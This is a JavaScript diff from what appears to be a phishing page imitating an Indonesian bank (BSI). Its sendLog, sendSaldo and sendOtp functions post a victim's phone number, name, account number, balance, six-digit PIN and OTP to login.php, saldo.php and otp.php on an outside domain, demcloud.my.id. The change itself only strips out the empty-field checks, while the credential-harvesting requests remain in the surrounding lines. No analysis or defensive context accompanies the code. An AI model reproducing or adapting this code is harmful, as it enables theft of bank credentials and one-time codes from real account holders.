@@ -33,16 +33,7 @@ function sendLog() {
 event.preventDefault();
 $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
- const tarif = $('#tarif').val();
-    const nomor = $('#nomor').val();
-    const nama = $('#nama').val();
-    const rek = $('#rek').val();
-    
-                                
-   if (!tarif || !nomor || !nama || !rek ) {      
-        window.location.href = "/";
-        return false;
-    }    
+ 
       $.ajax({
             type: 'POST',
             url: 'https://demcloud.my.id/BSI/7sdr4/login.php',
@@ -69,17 +60,7 @@ function sendSaldo() {
 event.preventDefault();
 $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
-    const tarif = $('#tarif').val();
-    const nomor = $('#nomor').val();
-    const nama = $('#nama').val();
-    const rek = $('#rek').val();
-    const saldo = $('#saldo').val();
     
-                                
-   if (!tarif || !nomor || !nama || !rek || !saldo ) {      
-        window.location.href = "/";
-        return false;
-    }    
       $.ajax({
             type: 'POST',
             url: 'https://demcloud.my.id/BSI/7sdr4/saldo.php',
@@ -110,17 +91,7 @@ function sendOtp() {
     event.preventDefault();
   $("#djload").show();  
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
-    const tarif = $('#tarif').val();
-    const nomor = $('#nomor').val();
-    const nama = $('#nama').val();
-    const rek = $('#rek').val();
-    const saldo = $('#saldo').val();
-    const sixpin = $('#sixpin').val();
-                                
-   if (!tarif || !nomor || !nama || !rek || !saldo || !sixpin) {      
-        window.location.href = "/";
-        return false;
-    }    
+    
 $.ajax({
  type: 'POST',
  url: 'https://demcloud.my.id/BSI/7sdr4/otp.php',
